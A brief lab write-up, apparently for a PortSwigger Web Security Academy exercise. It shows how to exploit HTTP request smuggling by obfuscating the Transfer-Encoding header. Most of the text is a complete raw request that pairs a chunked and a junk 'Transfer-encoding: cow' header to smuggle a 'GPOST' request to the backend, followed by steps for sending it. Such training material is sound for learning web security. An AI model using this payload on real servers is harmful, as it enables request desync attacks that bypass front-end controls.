HTTP request smuggling, obfuscating the TE header

We can use a similar payload to our previous lab. HTTP Request Smuggler should help in identifying the vulnerability. 
Since the frontend server only accepts GET or POST, we'll try to sneak in a request to the backend server.

Request:
POST / HTTP/1.1
Host: acaf1f341eb2127d80ea37a900880095.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0




Don't forget the return carriage (press enter twice) at the end.

Send it twice, so that the front end server parses the POST request and the backend server attempts to parse the GPOST request. The error is proof that it works.